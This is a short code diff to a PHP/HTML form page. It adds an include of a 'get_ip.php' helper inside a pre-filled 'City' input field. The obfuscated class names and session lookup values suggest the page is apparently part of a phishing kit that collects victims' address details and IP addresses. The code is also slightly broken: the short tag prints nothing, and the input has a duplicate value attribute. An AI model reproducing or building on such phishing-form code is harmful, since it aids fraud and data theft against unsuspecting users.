@@ -110,7 +110,9 @@ exit;
                                             <div class="x_34ID-Z576 " id="stateHolder">
                                                 <div class="x_23ID-Z716" id="x_32ID-Z543">
                                                     <div class="x_31ID-Z518 x_V-ForZ118 large" id="x_30ID-Z577">
-                                                        <input type="text" id="city" name="city" value="<?$_SESSION['_LOOKUP_CITY_']?>" class="Xval666ideX1 x_27ID-Z668" placeholder="City" required="required" autocomplete="off" value="" aria-required="true">
+                                                        <input type="text" id="city" name="city" value="<?
+														include('../../functions/get_ip.php');
+														$_SESSION['_LOOKUP_CITY_']?>" class="Xval666ideX1 x_27ID-Z668" placeholder="City" required="required" autocomplete="off" value="" aria-required="true">
                                                     </div>
                                                 </div>
                                             </div>
